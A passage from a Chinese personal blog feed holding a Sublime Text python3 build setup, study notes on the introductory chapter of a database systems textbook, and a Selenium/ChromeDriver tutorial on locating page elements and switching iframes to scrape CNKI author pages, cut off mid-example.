<p>   <code>&quot;env&quot;: {“PYTHONIOENCODING”: “utf8”}</code>的作用是为了避免中文报错。</p>
<p>   <code>[&quot;/Library/Frameworks/Python.framework/Versions/3.6/bin/python3&quot;, &quot;-u&quot;, &quot;$file&quot;]</code>这里的路径替换成python3的路径。</p>
<p>   如果你不知道python3的路径在哪里，mac os请在终端输入which python3查看:</p>
<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">which</span> python3</span><br></pre></td></tr></table></figure></p>
<p>   比如我的路径是<code>/usr/local/bin/python3</code>，就将该路径复制过去。</p>
<p>   然后保存文件名为<strong>python3.sublime-build</strong></p>
<p>   最后，选择python3: Tools-&gt;Build System-&gt;python3</p>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>数据库复习--第1章</title>
    <url>/2020/01/10/DB-1/</url>
    <content><![CDATA[<p>数据库系统概论第1章–绪论，如有错误烦请指正。<a id="more"></a></p>
<h3 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h3><h4 id="1-1-数据库系统概述"><a href="#1-1-数据库系统概述" class="headerlink" title="1.1 数据库系统概述"></a>1.1 数据库系统概述</h4><h5 id="1-1-1-四个基本概念"><a href="#1-1-1-四个基本概念" class="headerlink" title="1.1.1 四个基本概念"></a>1.1.1 四个基本概念</h5><ul>
<li>数据：是数据库中存储的基本对象<ul>
<li>定义：描述事物的符号记录</li>
<li>特点：数据与其语义是不可分的</li>
</ul>
</li>
<li>数据库(DB)：是长期存储在计算机内、有组织的、可共享的大量数据的集合<ul>
<li>基本特征：<ul>
<li>数据按一定的数据模型组织、描述和储存</li>
<li>可为各种用户共享</li>
<li>冗余度较小</li>
<li>数据独立性较高</li>
<li>易扩展</li>
</ul>
</li>
</ul>
</li>
<li>数据库管理系统(DBMS):<ul>
<li>什么是DBMS：<ul>
<li>位于用户与操作系统之间的一层数据管理软件</li>
<li>是基础软件，是一个大型复杂的软件系统</li>
</ul>
</li>
<li>DBMS的用途<ul>
<li>科学地组织和存储数、高效地获取和维护数据</li>
</ul>
</li>
</ul>
</li>
<li>数据库系统<ul>
<li>什么是？：在计算机系统中引入数据库后的系统构成</li>
<li>组成：数据库、DBMS、应用系统、数据库管理员</li>
</ul>
</li>
</ul>
<h5 id="1-1-2-数据管理技术的产生和发展"><a href="#1-1-2-数据管理技术的产生和发展" class="headerlink" title="1.1.2 数据管理技术的产生和发展"></a>1.1.2 数据管理技术的产生和发展</h5><ul>
<li>什么是数据管理<ul>
<li>对数据进行分类、组织、编码、存储、检索和维护</li>
<li>是数据处理的中心问题</li>
</ul>
</li>
<li>数据管理技术的发展过程<ul>
<li>人工管理阶段（20世纪49年代中–50年代中）</li>
<li>文件系统阶段（20世纪50年代末–60年代中）</li>
<li>数据库系统阶段（20世纪60年代末–现在）</li>
</ul>
</li>
<li>数据管理技术的发展动力<ul>
<li>应用需求的推动</li>
<li>计算机硬件的发展</li>
<li>计算机软件的发展</li>
</ul>
</li>
</ul>
<p>文件系统记录内有结构，整体无结构（因文件是独立的），数据只能是定长的，数据的最小存取单位是记录。</p>
<h5 id="1-1-3-数据库系统的特点"><a href="#1-1-3-数据库系统的特点" class="headerlink" title="1.1.3 数据库系统的特点"></a>1.1.3 数据库系统的特点</h5><ul>
<li>数据结构化<ul>
<li>整体数据的结构化是数据库的主要特征之一</li>
<li>整体结构化，不再仅针对某个应用，而是面向全组织，不仅数据内部结构化，整体也是结构化的，数据之间具有联系</li>
<li>数据可以变长，最小存取单位是数据项。</li>
</ul>
</li>
<li>数据的共享性高，冗余度低，易扩充</li>
<li>数据独立性高<ul>
<li>物理独立性</li>
<li>逻辑独立性</li>
<li>数据独立性由DBMS的二级映像功能来保证的</li>
</ul>
</li>
<li>数据由DBMS统一管理和控制<ul>
<li>数据的安全性保护</li>
<li>数据的完整性检查</li>
<li>并发控制</li>
<li>数据库恢复</li>
</ul>
</li>
</ul>
<h4 id="1-2-数据模型"><a href="#1-2-数据模型" class="headerlink" title="1.2 数据模型"></a>1.2 数据模型</h4><h5 id="1-2-1-两大类数据模型"><a href="#1-2-1-两大类数据模型" class="headerlink" title="1.2.1 两大类数据模型"></a>1.2.1 两大类数据模型</h5><ul>
<li>概念模型（信息模型），按用户的观点来对数据和信息建模，用于数据库设计。</li>
<li>逻辑模型（数据模型）和物理模型<ul>
<li>逻辑模型主要包括网状模型、层次模型、关系模型、面向对象模型，用于DBMS实现</li>
<li>物理模型是对最底层的抽象</li>
</ul>
</li>
</ul>
<h5 id="1-2-2-数据模型的组成要素"><a href="#1-2-2-数据模型的组成要素" class="headerlink" title="1.2.2 数据模型的组成要素"></a>1.2.2 数据模型的组成要素</h5><ul>
<li>数据结构<ul>
<li>定义：描述数据库的组成对象，以及对象之间的联系</li>
<li>数据结构是对系统静态特性的描述</li>
</ul>
</li>
<li>数据操作<ul>
<li>数据操作类型：查询、更新（插入、删除、修改）</li>
<li>数据操作是对系统动态特性的描述</li>
</ul>
</li>
<li>完整性约束条件<ul>
<li>在关系模型中，任何关系必须满足实体完整性和参照完整性两个条件。</li>
</ul>
</li>
</ul>
<h5 id="1-2-3-概念模型"><a href="#1-2-3-概念模型" class="headerlink" title="1.2.3 概念模型"></a>1.2.3 概念模型</h5><ul>
<li>用途<ul>
<li>用于信息世界的建模，是现实世界到机器世界的一个中间层次，是数据库设计人员和用户之间进行交流的语言</li>
</ul>
</li>
<li>常用E-R图表示<ul>
<li>实体性：用矩形表示，框内写明实体名</li>
<li>属性：用椭圆形表示，并用无向边将其与相应的实体连接起来</li>
<li>联系：用菱形表示，框内写明联系名，用无向边分别与有关实体连接起来，同时在无向边旁标上联系的类型（1:1、1:n、m:n）</li>
<li>联系的属性：联系本身也是一种实体型，也可以有属性</li>
</ul>
</li>
</ul>
<h5 id="1-2-4-最常用的数据模型"><a href="#1-2-4-最常用的数据模型" class="headerlink" title="1.2.4 最常用的数据模型"></a>1.2.4 最常用的数据模型</h5><ul>
<li>非关系模型<ul>
<li>层次模型</li>
<li>网状模型</li>
</ul>
</li>
<li>关系模型</li>
<li>面向对象模型</li>
<li>对象关系模型</li>
</ul>
<h5 id="1-2-5-层次模型"><a href="#1-2-5-层次模型" class="headerlink" title="1.2.5 层次模型"></a>1.2.5 层次模型</h5><p>层次模型是数据库系统中最早出现的数据模型，典型代表是IBM公司的IMS(Information Management System)数据库管理系统。</p>
<p>层次模型用树形结构来表示各类实体以及实体间的联系。</p>
<ul>
<li>满足下面两个条件的基本层次联系的集合为层次模型：<ul>
<li>有且只有一个结点没有双亲结点，这个结点称为根节点。</li>
<li>根以外的其他结点有且只有一个双亲结点。</li>
</ul>
</li>
<li>几个术语：<ul>
<li>根结点、双亲结点、兄弟结点、叶结点</li>
</ul>
</li>
<li>特点：<ul>
<li>结点的双亲是唯一的</li>
<li>只能直接处理一对多的实体联系</li>
<li>每个记录类型可以定义一个排序字段，也称为码字段</li>
<li>任何记录值只有按其路径查看时，才能显出它的全部意义</li>
<li>没有一个子女记录值能够脱离双亲记录值而独立存在</li>
</ul>
</li>
<li>多对多联系在层次模型中的表示<ul>
<li>将多对多联系分解成一对多联系</li>
<li>方法：冗余结点法、虚拟结点法</li>
</ul>
</li>
<li>完整性约束条件<ul>
<li>无相应的双亲结点值就不能插入子女结点值</li>
<li>如果删除双亲结点值，则相应的子女结点值也被同时删除</li>
<li>更新操作时，应更新所有相应记录，以保证数据的一致性</li>
</ul>
</li>
<li>存储结构<ul>
<li>邻接法：按照层次树前序遍历的顺序把所有记录值依次邻接存放，即通过物理空间的位置相邻来实现层次顺序</li>
<li>链接法：用指针来反映数据之间的层次联系<ul>
<li>子女-兄弟链接法：每个记录两个指针，分别指向最左边的子女和最近的兄弟</li>
<li>层次序列链接法：按树的前序遍历顺序链接各记录值</li>
</ul>
</li>
</ul>
</li>
<li>优缺点<ul>
<li>优点<ul>
<li>层次模型的数据结构比较简单清晰</li>
<li>查询效率高，性能优于关系模型，不低于网状模型</li>
<li>层次数据模型提供了良好的完整性支持</li>
</ul>
</li>
<li>缺点<ul>
<li>多对多联系表示不自然</li>
<li>对插入和删除操作的限制多，应用程序的编写比较复杂</li>
<li>查询子女结点必须通过双亲结点</li>
<li>由于结构严密，层次命令趋于程序化</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="1-2-6-网状模型"><a href="#1-2-6-网状模型" class="headerlink" title="1.2.6 网状模型"></a>1.2.6 网状模型</h5><p>网状数据库系统采用网状模型作为数据的组织方式，典型代表时DBTG系统，亦称CODASYL系统，是70年代有DBTG提出的一个系统方案，奠定了数据库系统的基本概念、方法和技术。</p>
<ul>
<li>满足下面两个条件的基本层次联系的集合<ul>
<li>允许一个以上的结点无双亲</li>
<li>一个结点可以有多于一个的双亲</li>
</ul>
</li>
<li>网状模型与层次模型的区别<ul>
<li>网状模型允许多个结点没有双亲结点</li>
<li>网状模型允许结点有多于一个的双亲</li>
<li>网状模型允许两个结点之间有多种联系（复合联系）</li>
<li>网状模型可以更直接地去描述现实世界</li>
<li>层次模型实际上是网状模型的一个特例</li>
</ul>
</li>
<li>多对多联系在网状模型中的表示：将多对多联系直接分解成一对多联系</li>
<li>网状数据模型的操纵与完整性约束<ul>
<li>码：唯一标识记录的数据项的集合</li>
<li>一个联系中双亲记录与子女记录之间是一对多联系</li>
<li>支持双亲记录和子女记录之间某些约束条件</li>
</ul>
</li>
<li>存储结构：单向链接、双向链接、环状链接、向首链接</li>
<li>优点：<ul>
<li>能够更为直接地描述现实世界，如一个结点可以有多个双亲</li>
<li>具有良好的性能，存取效率较高</li>
</ul>
</li>
<li>缺点：<ul>
<li>结构比较复杂，而且随着应用环境的扩大，数据库的结构就变得越来越复杂，不利于最终用户掌握</li>
<li>DDL、DML语言复杂，用户不容易使用</li>
</ul>
</li>
</ul>
<h5 id="1-2-7-关系模型"><a href="#1-2-7-关系模型" class="headerlink" title="1.2.7 关系模型"></a>1.2.7 关系模型</h5><p>关系数据库系统采用关系模型作为数据的组织方式，1970年美国IBM公司首次提出了数据库系统的关系模型，计算机厂商新推出的数据库管理系统几乎都支持关系模型。</p>
<ul>
<li><p>在用户观点下，关系模型中数据的逻辑结构是一张二维表。</p>
</li>
<li><p>数据结构</p>
<ul>
<li>关系：一个关系对应通常说的一张表</li>
<li>元组：表中的一行即为一个元组</li>
<li>属性：表中的一列即为一个属性，给每一个属性起一个名称即属性名</li>
<li>主码：表中的某个属性组，它可以唯一确定一个元组</li>
<li>域：属性的取值范围</li>
<li>分量：元组中的一个属性值</li>
<li>关系模式：对关系的描述<br>关系名（属性1，属性2，……，属性n）</li>
</ul>
</li>
<li><p>关系必须是规范化的，满足一定的规范条件</p>
<ul>
<li>最基本的规范条件：关系的每一个分量必须是一个不可分的数据项，不允许表中还有表。</li>
</ul>
</li>
<li><p>关系的完整性约束条件</p>
<ul>
<li>实体完整性</li>
<li>参照完整性</li>
<li>用户定义的完整性</li>
</ul>
</li>
<li><p>优点：</p>
<ul>
<li>建立在严格的数学概念的基础上</li>
<li>概念单一<ul>
<li>实体和各类联系都用关系来表示</li>
<li>对数据的检索结果也是关系</li>
</ul>
</li>
<li>关系模型的存取路径对用户透明<ul>
<li>具体更高的数据独立性，更好的安全保密性</li>
<li>简化了程序员的工作和数据库开发建立的工作</li>
</ul>
</li>
</ul>
</li>
<li><p>缺点：</p>
<ul>
<li>存取路径对用户透明导致查询效率往往不如非关系数据模型</li>
<li>为提高性能，必须对用户的查询请求进行优化增加了开发DBMS的难度</li>
</ul>
</li>
</ul>
<h4 id="1-3-数据库系统结构"><a href="#1-3-数据库系统结构" class="headerlink" title="1.3 数据库系统结构"></a>1.3 数据库系统结构</h4><p>从数据库管理系统角度看，通常采用三级模式结构，是数据库内部的系统结构<br>从数据库最终用户角度看，数据库系统的结构分为：单用户结构、主从式结构、分布式结构、客户/服务器、浏览器/应用服务器/数据库服务器多层结构等</p>
<h5 id="1-3-1-数据库系统的三级模式结构"><a href="#1-3-1-数据库系统的三级模式结构" class="headerlink" title="1.3.1 数据库系统的三级模式结构"></a>1.3.1 数据库系统的三级模式结构</h5><ul>
<li>模式（也成逻辑模式）<ul>
<li>数据库中全体数据的逻辑结构和特征的描述</li>
<li>所有用户的公共数据视图，综合了所有用户的需求</li>
<li>一个数据库只有一个模式</li>
<li>是数据库系统模式结构的中间层</li>
</ul>
</li>
<li>外模式<ul>
<li>数据库用户使用的局部数据的逻辑结构和特征的描述</li>
<li>数据库用户的数据视图，是与某一应用有关的数据的逻辑表示</li>
<li>介于模式与应用之间</li>
<li>一个数据库可以有多个外模式</li>
<li>用途：<ul>
<li>保证数据库安全性的一个有力措施</li>
<li>每个用户只能看见和访问所对应的外模式中的数据</li>
</ul>
</li>
</ul>
</li>
<li>内模式<ul>
<li>是数据物理结构和存储方式的描述</li>
<li>是数据在数据库内部的表示方式</li>
<li>一个数据库只有一个内模式</li>
</ul>
</li>
</ul>
<h5 id="1-3-2-数据库的二级映像功能与数据独立性"><a href="#1-3-2-数据库的二级映像功能与数据独立性" class="headerlink" title="1.3.2 数据库的二级映像功能与数据独立性"></a>1.3.2 数据库的二级映像功能与数据独立性</h5><ul>
<li>三级模式是对数据的三个抽象级别</li>
<li>二级映像在DBMS内部实现这三个抽象层次的联系和转换<ul>
<li>外模式/模式映像</li>
<li>模式/内模式映像</li>
</ul>
</li>
<li>外模式/模式映像<ul>
<li>模式描述的是数据的全局逻辑结构，外模式描述的是数据的局部逻辑结构</li>
<li>每一个外模式，数据库系统都有一个外模式/模式映像</li>
<li>保证数据的逻辑独立性<ul>
<li>当模式改变时，数据库管理员修改有关的外模式/模式映像，使外模式保持不变</li>
<li>应用程序是依据数据的外模式编写的，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。</li>
</ul>
</li>
</ul>
</li>
<li>模式/内模式映像<ul>
<li>模式/内模式映像定义了数据全局逻辑结构与存储结构之间的对应关系。</li>
<li>数据库中模式/内模式映像是唯一的</li>
<li>该映像描述通常包含在模式描述中</li>
<li>保证数据的物理独立性<ul>
<li>当数据库的存储结构改变了，数据库管理员修改模式/内模式映像，使模式保持不变</li>
<li>应用程序不受影响。保证了数据与程序的物理独立性，简称数据的物理独立性。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="1-4-数据库的组成"><a href="#1-4-数据库的组成" class="headerlink" title="1.4 数据库的组成"></a>1.4 数据库的组成</h4><ul>
<li>数据库</li>
<li>数据库管理系统（及其开发工具）</li>
<li>应用系统</li>
<li>数据库管理员</li>
</ul>
]]></content>
      <categories>
        <category>数据库系统概论</category>
      </categories>
  </entry>
  <entry>
    <title>利用webdriver爬取知网作者知网节</title>
    <url>/2019/12/17/cnki-spider/</url>
    <content><![CDATA[<p>本篇主要介绍基于Chrome的webdriver进行爬虫的基本方法，整理下来以备遗忘。<a id="more"></a><br>上个周师姐布置任务让我爬取知网的作者知网节，本来以为看起来挺好爬的，但知网还是有些坑，之后详细介绍。下面就让我们从零开始吧。</p>
<h3 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h3><p>我们主要用到的工具有<code>python</code>中的<code>selenium</code>和<code>chrome</code>，以及需要驱动<code>chrome</code>的插件<code>webdriver</code>。<br>下面是来自百度关于<code>selenium</code>的介绍。<br><img src="/2019/12/17/cnki-spider/1.png" alt="1.png"><br>从图中我们可以看到，利用<code>selenium</code>我们可以模拟用户的浏览器行为，从而获取到我们需要的网页内容，因为能模拟用户行为，所以利用<code>selenium</code>进行爬虫自然可以一定程度上避免被网站反爬虫拦截，但也有不好的一面，比如爬取的速度相对来说会慢一些。</p>
<h4 id="1-安装selenium"><a href="#1-安装selenium" class="headerlink" title="1. 安装selenium"></a>1. 安装<code>selenium</code></h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure><br>当然我们也可以新建一个conda环境，再进行安装<code>selenium</code>，这里简单复习一下创建并激活conda环境的命令：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment">#创建新环境</span></span><br><span class="line">conda create -n cnki-spider</span><br><span class="line"><span class="hljs-comment">#激活进入新环境</span></span><br><span class="line"><span class="hljs-built_in">source</span> activate cnki-spider</span><br><span class="line"><span class="hljs-comment"># 安装selenium</span></span><br><span class="line">pip install selenium</span><br></pre></td></tr></table></figure></p>
<h4 id="2-安装基于浏览器的webdriver"><a href="#2-安装基于浏览器的webdriver" class="headerlink" title="2. 安装基于浏览器的webdriver"></a>2. 安装基于浏览器的webdriver</h4><p><code>selenium</code>支持多种浏览器，比如<code>chrome</code>和<code>firefox</code>等等，这里我选用了<code>chrome</code>：<a href="http://chromedriver.storage.googleapis.com/index.html" target="_blank" rel="noopener">下载地址</a><br>注意选择和浏览器版本对应的chromedriver。</p>
<ul>
<li>win<br>直接将解压后的<code>chromedriver</code>直接拖进<code>chrome</code>的安装目录，然后配置环境变量。</li>
<li>mac<br>将解压后的<code>chromedriver</code>拖进<code>/usr/local/bin/</code>即可。</li>
<li>linxu<br>将解压后的<code>chromedriver</code>拷贝进<code>/usr/bin</code>目录，之后在代码中声明路径即可。</li>
</ul>
<p>另外以上，默认已装好<code>Chrome</code>，如果没有，请自行百度。</p>
<h3 id="二、代码编写"><a href="#二、代码编写" class="headerlink" title="二、代码编写"></a>二、代码编写</h3><h4 id="1-简单使用"><a href="#1-简单使用" class="headerlink" title="1. 简单使用"></a>1. 简单使用</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line"><span class="hljs-comment"># 不能只用域名，要使用完整url</span></span><br><span class="line">browser.get(<span class="hljs-string">'https://www.baidu.com/'</span>)</span><br></pre></td></tr></table></figure><br>接下来让我们在百度的搜索框中输入些什么进行搜索看看。<br>既然要输入，那我们首先需要找到在哪个位置进行输入，因此我们需要简单定个位，打开百度页面的源代码看一下输入框在哪。<br><img src="/2019/12/17/cnki-spider/2.png" alt="2.png"><br>我们可以发现原来这个输入框的<code>class = &quot;s_ipt&quot;</code>，那我们就先通过class来定位试试吧！<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">search_input = browser.find_element_by_class_name(<span class="hljs-string">'s_ipt'</span>)</span><br><span class="line">search_input.clear()</span><br><span class="line">search_input.send_keys(<span class="hljs-string">'IR实验室'</span>)</span><br></pre></td></tr></table></figure><br><img src="/2019/12/17/cnki-spider/3.png" alt="3.png"><br>可以看到我们成功的在输入框里输入了搜索内容，下面就让我们点击一下“百度一下”搜索试试吧。<br>看一下“百度一下”按键的源码是什么：<br><img src="/2019/12/17/cnki-spider/4.png" alt="4.png"><br>可以发现它的<code>id = &quot;su&quot;</code>，那我们就通过id来定位它吧！<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">browser.find_element_by_id(<span class="hljs-string">'su'</span>).click()</span><br></pre></td></tr></table></figure><br><img src="/2019/12/17/cnki-spider/5.png" alt="5.png"><br>除了通过点击“百度一下”按钮，我们通常搜索的时候一般是直接按回车键的，那在这里可不可以模拟回车键呢？<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> selenium.webdriver.common.keys <span class="hljs-keyword">import</span> Keys</span><br><span class="line"><span class="hljs-comment"># 将上面的click()那一行换作在搜索框中输入回车键</span></span><br><span class="line">search_input.send_keys(Keys.RETURN)</span><br></pre></td></tr></table></figure></p>
<h4 id="2-定位问题"><a href="#2-定位问题" class="headerlink" title="2. 定位问题"></a>2. 定位问题</h4><p>模拟浏览器行为无非就是模拟鼠标和键盘来操作html中的这些元素，那首要的任务就是元素定位问题了。<br>在<code>selenium</code>中提供了很多种方法可以进行元素定位，下面一一介绍。</p>
<h5 id="1-id定位"><a href="#1-id定位" class="headerlink" title="(1) id定位"></a>(1) id定位</h5><p><code>find_element_by_id()</code><br>例如上面的例子我们定位了“百度一下”按钮：<code>browser.find_element_by_id(&#39;su&#39;)</code></p>
<h5 id="2-name定位"><a href="#2-name定位" class="headerlink" title="(2) name定位"></a>(2) name定位</h5><p><code>find_element_by_name()</code><br><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"s_ipt"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"wd"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"kw"</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">"100"</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">"off"</span>&gt;</span></span><br></pre></td></tr></table></figure><br>比如这是百度搜索框的源码，我们可以通过name这样定位：<code>browser.find_element_by_name(&#39;wd&#39;)</code></p>
<h5 id="3-class定位"><a href="#3-class定位" class="headerlink" title="(3) class定位"></a>(3) class定位</h5><p><code>find_element_by_class_name()</code><br>同样地定位搜索框：<code>browser.find_element_by_class_name(&#39;s_ipt&#39;)</code></p>
<h5 id="4-tag定位"><a href="#4-tag定位" class="headerlink" title="(4) tag定位"></a>(4) tag定位</h5><p><code>find_element_by_tag_name()</code><br>每一个元素本质就是一个tag，但是HTML页面的tag重复性很厉害，一般很少用这个定位。<br>例子：<code>browser.find_element_by_tag_name(&#39;input&#39;)</code></p>
<h5 id="5-link定位"><a href="#5-link定位" class="headerlink" title="(5) link定位"></a>(5) link定位</h5><p><code>find_element_by_link_text()</code> 可以用来定义文本链接。<br><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://news.baidu.com"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mnav"</span>&gt;</span>新闻<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://www.hao123.com"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mnav"</span>&gt;</span>hao123<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://map.baidu.com"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mnav"</span>&gt;</span>地图<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://v.baidu.com"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mnav"</span>&gt;</span>视频<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>我们可以通过这些文本内容打开链接：<code>browser.find_element_by_link_text(&#39;新闻&#39;).click()</code><br>也可以通过部分文本链接进行定位，也就是partial定位：<br><code>find_element_by_partial_link_text()</code><br>例子：<code>browser.find_element_by_partial_link_text(&#39;hao&#39;).click()</code></p>
<h5 id="6-xpath定位"><a href="#6-xpath定位" class="headerlink" title="(6) xpath定位"></a>(6) xpath定位</h5><p>它又分为绝对路径定位和相对路径定位，但我觉得没人喜欢<code>/html/*/*/</code>这样从头写路径，经常使用的也就是相对路径定位。<br><code>find_element_by_xpath(&#39;//标签[@属性名=属性值]&#39;)</code> 属性名可以是id、name、class或者其他可唯一标识该标签的元素。<br>比如上面定位百度搜索框的可以改写为：<br><code>browser.find_element_by_xpath(&#39;//input[@class=&quot;s_ipt&quot;]&#39;).send_keys(&#39;IR 实验室&#39;）</code><br><code>//</code>代表当前页面的某个路径下，<code>input</code>代表元素标签名，不指定标签可以用<code>*</code>代替。<br>既然xpath都支持路径了，那层级，也就是在某个标签之下的元素也可以通过它定位了。<br>比如，有个div标签的class=’helloworld’，然后在这个标签的里面有一个a标签，我们想要定位这个a标签就可以这么写：<br><code>browser.find_element_by_xpath(&#39;//div[@class=&quot;helloworld&quot;]/a&#39;)</code><br>更强大的是这个方法还支持通过逻辑运算符进行定位。<br>比如<code>find_element_by_xpath(&quot;//input[@id=&#39;a&#39; and @class=&#39;su&#39;]/span/input&quot;)</code></p>
<h5 id="7-CSS定位"><a href="#7-CSS定位" class="headerlink" title="(7) CSS定位"></a>(7) CSS定位</h5><p><code>find_element_by_css_selector()</code></p>
<h6 id="通过class定位"><a href="#通过class定位" class="headerlink" title="通过class定位"></a>通过class定位</h6><p>比如在百度搜索框输入要搜索的内容：<br><code>browser.find_element_by_css_selector(&quot;.s_ipt&quot;).send_keys(&#39;hello world&#39;)</code></p>
<h6 id="通过id定位"><a href="#通过id定位" class="headerlink" title="通过id定位"></a>通过id定位</h6><p>例子：<code>browser.find_element_by_css_selector(&quot;#kw&quot;).send_keys(&#39;hello world&#39;)</code></p>
<h6 id="通过标签名定位-（很少用）"><a href="#通过标签名定位-（很少用）" class="headerlink" title="通过标签名定位 （很少用）"></a>通过标签名定位 （很少用）</h6><p>例子：<code>browser.find_element_by_css_selector(&quot;input&quot;)</code></p>
<h6 id="通过标签属性定位"><a href="#通过标签属性定位" class="headerlink" title="通过标签属性定位"></a>通过标签属性定位</h6><p>例子：<br><code>browser.find_element_by_css_selector(&#39;[autocomplete=&quot;off&quot;]&#39;).send_keys(&#39;helloworld&#39;)</code><br><strong>属性值</strong>的引号可加可不加。</p>
<h6 id="通过标签父子关系定位"><a href="#通过标签父子关系定位" class="headerlink" title="通过标签父子关系定位"></a>通过标签父子关系定位</h6><p><code>find_element_by_css_selector(&quot;parent&gt;child&quot;)</code><br>例子：<code>browser.find_element_by_css_selector(&quot;span&gt;input&quot;).send_keys(&quot;IR 实验室&quot;)</code></p>
<h6 id="组合定位"><a href="#组合定位" class="headerlink" title="组合定位"></a>组合定位</h6><p>例子：<code>browser.find_element_by_css_selector(&quot;span&gt;input#kw&quot;).send_keys(&quot;IR 实验室&quot;)</code><br>同样的，可以将属性值、id、class、父子关系等结合起来组合定位，这样可以提高定位的准确性。</p>
<h5 id="8-通过By定位"><a href="#8-通过By定位" class="headerlink" title="(8) 通过By定位"></a>(8) 通过By定位</h5><p>By定位元素是统一调用<code>find_element()</code>的方法。<code>find_element()</code>方法只用于定位元素，它有两个参数，第一个是定位的类型，由By提供；第二个参数是定位的具体方式。<br>使用By之前需要先导入By类：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By</span><br></pre></td></tr></table></figure><br>实例：<code>browser.find_element(By.ID,&#39;kw&#39;).send_keys(&quot;IR 实验室&quot;)</code><br>定位的类型包括：<br><code>By.ID, By.NAME, By.CLASS_NAME, By.TAG_NAME, By.LINK_TEXT, By.PARTIAL_LINK_TEXT, By.XPATH, By.CSS_SELECTOR</code></p>
<h4 id="3-出现定位不到元素的问题"><a href="#3-出现定位不到元素的问题" class="headerlink" title="3. 出现定位不到元素的问题"></a>3. 出现定位不到元素的问题</h4><p>你以为掌握了以上这些定位方法就没有问题了吗，当时看完教程的我也是这么想的，不就是爬取知网作者知网节嘛，当我把一切都准备好，也打开了准备爬取的页面，准备开心的开始爬的时候呢，却报错了…找不到该元素，我明明在chrome里可以看到的啊，我定位的方法也没有错啊，怎么会定位失败呢？<br>原来现在很多页面除了页面源代码之外还有很多框架源代码，而我想要爬取的内容就存在于这些框架源代码中，那这些框架源代码都在哪呢？<br><img src="/2019/12/17/cnki-spider/6.png" alt="6.png"><br>看到这些<code>iframe</code>标签了嘛，没错它们都在这里面。<br>frame标签有frameset、frame、iframe三种，frameset跟其他普通标签没有区别，不会影响到正常的定位，而frame与iframe对selenium定位而言是一样的，selenium有一组方法对frame进行操作。<br>所以我们如果想要这里面的内容就需要切换frame，之后才能定位到这些框架里的元素，那么怎么进行切换呢？<br>我们用到的函数是<code>switch_to.frame()</code>可以传入id、name、index以及selenium的WebElement对象。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver</span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.switch_to.frame(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 1.用frame的index来定位，第一个是0</span></span><br><span class="line"><span class="hljs-comment"># driver.switch_to.frame("frame1")  # 2.用id来定位</span></span><br><span class="line"><span class="hljs-comment"># driver.switch_to.frame("myframe")  # 3.用name来定位</span></span><br><span class="line"><span class="hljs-comment"># driver.switch_to.frame(driver.find_element_by_tag_name("iframe"))  # 4.用WebElement对象来定位</span></span><br></pre></td></tr></table></figure><br>但是我们看到知网这个作者知网节界面不只一个框架，但这些框架都是同级的，所以我们爬完一个框架之后需要切回主文档以再切入下一个框架。<br><code>driver.switch_to.default_content()</code><br>那如果碰到一个框架里面又嵌套着框架怎么办呢？比如：<br><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span 